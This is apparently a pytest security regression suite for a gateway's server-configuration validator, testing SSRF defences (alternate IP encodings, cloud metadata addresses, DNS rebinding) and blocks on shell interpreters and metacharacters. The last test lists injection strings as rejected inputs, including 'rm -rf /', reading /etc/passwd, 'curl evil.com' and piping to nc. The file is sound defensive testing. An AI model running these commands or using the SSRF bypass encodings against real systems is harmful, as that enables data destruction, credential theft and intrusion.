"""
Phase 7 Automated Security Regression Test:
SSRF vectors, alternate IP encodings, DNS rebinding guards, and stdio transport restrictions.
"""

import pytest
from unittest.mock import patch
import socket

from gateway.server_validator import (
    ServerConfigValidationError,
    is_forbidden_ip,
    parse_flexible_ip,
    validate_server_config,
)


def test_parse_flexible_ip_formats():
    """Verify parsing of decimal integer, hex, octal, shortened, and IPv4-mapped IPv6 IPs."""
    # Decimal integer representing 127.0.0.1 (2130706433)
    ip_dec = parse_flexible_ip("2130706433")
    assert ip_dec is not None
    assert str(ip_dec) == "127.0.0.1"

    # Hexadecimal IP 0x7f000001 -> 127.0.0.1
    ip_hex = parse_flexible_ip("0x7f000001")
    assert ip_hex is not None
    assert str(ip_hex) == "127.0.0.1"

    # Dotted octal 0177.0.0.1 -> 127.0.0.1
    ip_oct = parse_flexible_ip("0177.0.0.1")
    assert ip_oct is not None
    assert str(ip_oct) == "127.0.0.1"

    # Shortened decimal 127.1 -> 127.0.0.1
    ip_short = parse_flexible_ip("127.1")
    assert ip_short is not None
    assert str(ip_short) == "127.0.0.1"

    # IPv4-mapped IPv6 ::ffff:127.0.0.1 -> extracted to 127.0.0.1
    ip_mapped = parse_flexible_ip("::ffff:127.0.0.1")
    assert ip_mapped is not None
    assert str(ip_mapped) == "127.0.0.1"

    # Standard public domain returns None
    assert parse_flexible_ip("api.github.com") is None


def test_cloud_metadata_ips_strictly_forbidden_everywhere():
    """Cloud metadata IPs across AWS, GCP, Azure, Alibaba, and Oracle are forbidden in all envs."""
    metadata_ips = [
        "169.254.169.254",   # AWS / GCP / Azure IMDS
        "100.100.100.200",   # Alibaba IMDS
        "168.63.129.16",     # Azure WireServer
        "192.0.0.192",       # Oracle Cloud
        "::ffff:169.254.169.254", # IPv4-mapped metadata
    ]
    for ip_str in metadata_ips:
        parsed = parse_flexible_ip(ip_str)
        assert parsed is not None
        forbidden, reason = is_forbidden_ip(parsed)
        assert forbidden is True
        assert "strictly forbidden" in reason

        formatted_host = f"[{ip_str}]" if ":" in ip_str else ip_str
        with pytest.raises(ServerConfigValidationError, match="strictly forbidden"):
            validate_server_config(
                server_id="test_meta",
                name="Meta Server",
                transport="sse",
                connection_config={"url": f"http://{formatted_host}/meta-data/"},
            )


def test_production_blocks_loopback_and_private_alternate_encodings():
    """Production mode must reject integer, hex, octal, and shortened loopback/private IPs."""
    alternate_loopbacks = [
        "http://2130706433/mcp",   # Decimal 127.0.0.1
        "http://0x7f000001/mcp",   # Hex 127.0.0.1
        "http://0177.0.0.1/mcp",   # Octal 127.0.0.1
        "http://127.1/mcp",        # Shortened 127.0.0.1
        "http://[::ffff:127.0.0.1]/mcp", # IPv4-mapped loopback
    ]

    with patch("gateway.server_validator.is_production", return_value=True), \
         patch("gateway.server_validator.is_dev_mocks_enabled", return_value=False):
        for url in alternate_loopbacks:
            with pytest.raises(ServerConfigValidationError, match="not permitted in production"):
                validate_server_config(
                    server_id="bypass_attempt",
                    name="Bypass Server",
                    transport="sse",
                    connection_config={"url": url},
                )


def test_dns_resolution_private_ip_detection():
    """Domain names resolving to private or loopback IPs must be blocked in production."""
    fake_addr_info = [
        (socket.AF_INET, socket.SOCK_STREAM, 6, "", ("192.168.1.50", 80))
    ]

    with patch("gateway.server_validator.is_production", return_value=True), \
         patch("gateway.server_validator.is_dev_mocks_enabled", return_value=False), \
         patch("socket.getaddrinfo", return_value=fake_addr_info):
        with pytest.raises(ServerConfigValidationError, match="resolves to forbidden address"):
            validate_server_config(
                server_id="dns_rebinding",
                name="Rebinding Server",
                transport="sse",
                connection_config={"url": "http://evil-private.attacker.com/mcp"},
            )


def test_stdio_dangerous_shell_interpreters_blocked():
    """Shell interpreters (sh, bash, cmd.exe, powershell.exe) are rejected as stdio commands."""
    forbidden_cmds = [
        "sh", "bash", "/bin/sh", "/usr/bin/bash",
        "cmd.exe", "powershell.exe", "pwsh", "zsh"
    ]
    for cmd in forbidden_cmds:
        with pytest.raises(ServerConfigValidationError, match="Shell interpreter '.*' is not permitted"):
            validate_server_config(
                server_id="stdio_shell",
                name="Shell Server",
                transport="stdio",
                connection_config={"command": cmd, "args": ["-c", "whoami"]},
            )


def test_stdio_expanded_shell_metacharacters():
    """Subshells, quotes, newlines, and redirection metacharacters are rejected."""
    dangerous_args = [
        "$(whoami)",
        "`cat /etc/passwd`",
        "arg1; rm -rf /",
        "arg1 && touch /tmp/pwn",
        "arg1\ncurl evil.com",
        "arg1 | nc 1.2.3.4 4444",
        "arg1'OR'1'='1",
    ]
    for arg in dangerous_args:
        with pytest.raises(ServerConfigValidationError, match="forbidden shell metacharacters"):
            validate_server_config(
                server_id="stdio_metachar",
                name="Metachar Server",
                transport="stdio",
                connection_config={"command": "python", "args": [arg]},
            )
